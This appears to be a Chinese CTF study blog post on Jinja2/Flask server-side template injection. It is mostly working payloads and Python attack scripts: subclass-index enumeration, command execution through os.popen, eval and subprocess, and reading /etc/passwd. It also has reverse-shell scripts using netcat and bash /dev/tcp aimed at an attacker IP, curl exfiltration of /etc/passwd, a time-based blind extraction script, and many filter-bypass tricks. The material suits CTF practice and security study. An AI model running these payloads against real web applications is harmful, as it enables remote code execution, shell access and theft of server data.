---
title: SSTI注入
date: 2024-08-08 19:40:42
categories:
- SSTI
tags:
- SSTI注入
- 注入
description: " "
---
&emsp;&emsp;SSTI是一种服务器端模板注入漏洞，它出现在使用模板引擎的web应用程序中。模块引擎是一种将动态数据与静态模板结合生成最终输出的工具。然而，如果在构建模板时未正确处理用户输入，就可能导致SSTI漏洞的产生。

### 引擎识别
&emsp;&emsp;做题的时候，对照这个图片就可以判断是哪种引擎了。
![SSTI](/images/SSTI.png)

### 魔术方法
&emsp;&emsp;我们先了解一些基础的方法，然后就懂得payload是怎样的了。
```
__class__   # 查找当前类型的所属对象
__base__    # 沿着父子类的关系往上走一个
__mro__     # 查找当前类对象的所有继承类
__subclasses__() #查找父类下的所有子类，括号不能少
__init__    # 查看类是否重载,如果出现wrapper字眼，说明没有重载，就不能利用
__globals__ # 函数会以字典的形式返回当前对象的全部全局变量
```
&emsp;&emsp;那么大致的做题思路就是，先判断引擎，在套用方法。

### 查询注入模块
&emsp;&emsp;有回显我们可以直接用三步，将模块列举出来，没有也可以用脚本跑出来，然后选择合适的注入模块利用(用数列表示)即可。
```
{{().__class__.__base__.__subclasses__()}}
{{".__class__.__base__.__subclasses__()}}
{{"".__class__.__base__.__subclasses__()}}
{{config.__class__.__base__.__subclasses__()}}
{{[].__class__.__base__.__subclasses__()}}
```
```
import requests
url=input("请输入URL连接：")
for i in range(500):
    data={"post参数":"{{().__class__.__base__.__subclasses__()["+str(i)+"]}}"}
    try:
        response = requests.post(url,data=data)
        #print(response.text)
        if response.status_code == 200:
            if '_frozen_importlib_external.FileLoader（注入模块）' in response.text:
                print(i)  #输出所在行数
    except:
        pass
```

### 利用注入模块
&emsp;&emsp;知道模块所在行数(__subclasses__()[模块所在行数])后，就可以构造payload执行命令了,例如：
```
{{".__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("tac flag").read()')}}
```
&emsp;&emsp;这里用的注入模块(子类)为`_wrap_close`,<font color=red>注：方法为两条下划线，类（注入模块）只有一条且注入模块的位置不固定，也就是[]里面的数字是发生变化的。</font>
```
__builtins__    # 提供对python的所有"内置"标识符的直接访问
eval()          # 计算字符串表达式的值
popen()         # 执行一个shell以运行命令来开启一个进程
```

### 常用注入模块
&emsp;&emsp;知道上面这些方法怎么用之后，我们就可以利用注入模块，也就是里面存在的子类去调用它们执行命令(没有标记修改的说明data部分不需要修改)。常用的有

#### 文件读取
```
查询注入模块  _frozen_importlib_external.FileLoader
payload: {{".__class__.__mro__[1].__subclasses__()[79]["get_data"](0,"/etc/passwd")}}
```

#### 内建函数eval执行命令
```
查询注入模块 _wrap_close或者eval
(用查询脚本的修改部分)
data={"post参数" = “{{".__class__.__base__.__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']}}”}
if 'eval' in response.text:

payload: {{".__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("tac flag").read()')}}
```

#### os模块执行命令
```
通过config,调用os
{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
通过url_for,调用os
{{url_for.__globals__.os.popen('/etc/passwd').read()}}
查询注入模块 _wrap_close或者os
(用查询脚本的修改部分)
data={"post参数":"{{().__class__.__base__.__subclasses__()["+str(i)+"].__init__.globals__}}"}
if 'os.py' in response.text:

payload: {{".__class__.__bases__[0].__subclasses__()[199].__init__.__globals__['os'].popen("ls /").read()}}
```

#### importlib类执行命令
```
查询注入模块 _frozen_importlib.Builtinlmporter
payload: {{[].__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("cat flag").read()}}
```

#### linecache函数执行命令
```
查询注入模块 linecache
(用查询脚本的修改部分)
data={"post参数":"{{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"}
if 'linecache' in response.text:

payload: {{[].__class__.__base__.__subclasses__()[191].__init__.__globals__.linecache.os.popen("ls -l /").read()}}
```

#### subprocess.Popen类执行命令
```
查询注入模块 subprocess.Popen
payload: {{().__class__.__base__.__subclasses__()[200]("tac flag",shell=True,stdout=-1).communicate()[0].strip()}}
```

### 无回显SSTI
&emsp;&emsp;那有人就要问了，哎呀，题目没有回显怎么办啊，简单~(用脚本无脑都可以)

#### 反弹shell
```
import requests
url = "http://127.0.0.1" #URL
for i in range(300):
    try:
        data = {"post参数":'{{"".__class__.__base__.__subclasses__()['+str(i)+'].__init__.__globals__["popen"]("netcat 192.168.5.51(kaliIP) 7777 -e /bin/bash").read()}}'}
        #或者"bash -i >& /dev/tcp/XXXX(服务器/跳板)/XXXX（端口号） 0>&1"
        response = requests.post(url,data=data)
    except:
        pass
```
&emsp;&emsp;同时kali监听(nc -lnvp 7777)即可。

#### 带外注入
```
import requests
url = "http://127.0.0.1:" #URL
for i in range(300):
    try:
        data={"post参数":'{{"".__class__.__base__.__subclasses__()['+str(i)+'].__init__.__globals__["popen"]("curl http://192.168.5.51(kaliIP)/`cat /etc/passwd`").read()}}'}
        response = requests.post(url,data=data)
    except:
        pass
```
&emsp;&emsp;同时kali开启一个python http监听(python3 -m http.server 80)

#### 纯盲注
```
import requests
import time
url = input("请输入 URL：")
request_parameter = input("请输入 POST 请求参数：")
cs = " !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
flag = ""
# range() 参数为 脚本2 得到的 flag 长度
for i in range(25):
    low = 0
    high = len(cs)
    while low<high:
        index = low + (high - low) // 2
        start_time = time.time()
        # request_parameter 为 post 传入数据的参数名，根据实际情况输入
        data = { request_parameter:"{%set flag=().__class__.__base__.__subclasses__()[66].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"cat flag\").read()')%}{%if flag["+str(i)+"]=='"+cs[index]+"'%}{{().__class__.__base__.__subclasses__()[66].__init__.__globals__['__builtins__']['eval']('__import__(\"time\").sleep(2)')}}{%elif flag["+str(i)+"]>'"+cs[index]+"'%}{{().__class__.__base__.__subclasses__()[66].__init__.__globals__['__builtins__']['eval']('__import__(\"time\").sleep(4)')}}{%endif%}" }
        response = requests.post(url, data=data)
        end_time = time.time()
        # 计算响应时间
        response_time = end_time - start_time
        if response_time >=2 and response_time<=4:
            flag+=cs[index]
            print(cs[index],end='\t')
            low = high
        elif response_time>4:
            low = index+1
        else:
            high = index
print("\n"+flag)
```
&emsp;&emsp;二分法直接爆破flag。  

### 绕过
#### 双大括号
&emsp;&emsp;双大括号被过滤，可尝试{% if 2>1 %}glory{%endif%}能否正常执行，通过则可以用
```
{%if "".__class__.__base__.....}glory{% endif %}
```

#### 中括号
&emsp;&emsp;中括号被过滤，可尝试__getitem__()来代替[],类似于
```
{{".__class__.__base__.subclasses__90.__getitem__(1)}}
```

#### 单双引号
&emsp;&emsp;单双引号被过滤，可尝试<font color=red>request.args.GET参数或request.form.POST参数</font>来进行绕过,类似于
```
{{().__class__.__base__.__subclasses__()[117].__init__.__globals__[request.form.a](request.form.b).read()}}&a=popen&b=cat /flag.txt
```
#### 下划线
&emsp;&emsp;同理可以使用request创建一个变量，在变量里面使用下划线。  
&emsp;&emsp;使用unicode，base64编码或者16位编码。  
&emsp;&emsp;格式化字符串。  

#### 点
&emsp;&emsp;可以使用中括号[]代替点，类似于
```
{{()['__class__']['__base__']......}}  
```
&emsp;&emsp;可以使用attr()函数,类似于
```
{{()|attr('__class__')|attr('__base__')......}}  
```

#### 关键字
##### "+"拼接
&emsp;&emsp;类似于
```
{{()['__cl'+'ass__']}}
```

##### jinjia2中的"~"拼接
&emsp;&emsp;类似于
```
{%set a='__cla'%}{%set b='ss__'%}{{()[a~b]}}  
```

##### reverse
&emsp;&emsp;类似于
```
{%set a="__ssalc__"|reverse%}{{()[a]}}  
```

##### replace
&emsp;&emsp;类似于
```
{%set a="__claee__"|replace("ee","ss")%}{{()[a]}}  
```

##### join
&emsp;&emsp;类似于
```
{%set a=dict(__cla=a,ss__=a)|join%}{{()[a]}}  
```

##### 利用python的char的ASCII码

#### 数字
&emsp;&emsp;不允许有数字，我们就让它们自己计算出数字再利用，可用到length，用法如下:{% set a='aaaaaaaaaa'|length %}{{a}},输出结果为10，以此还可以进行加减乘除的运算。  

#### 获取符号
&emsp;&emsp;利用flask内置函数和对象获取符号，具体用法如下:  
1.使用list可查看拆分字符  
```
{%set a=({}|select()|string())|list%}{{a}}  
```
2.[x]可调取第x位字符(从0计位数)  
```
{%set a=({}|select()|string())|[x]%}{{a}}  
```

### 结语
&emsp;&emsp;乘风破浪会有时，直挂云帆济沧海。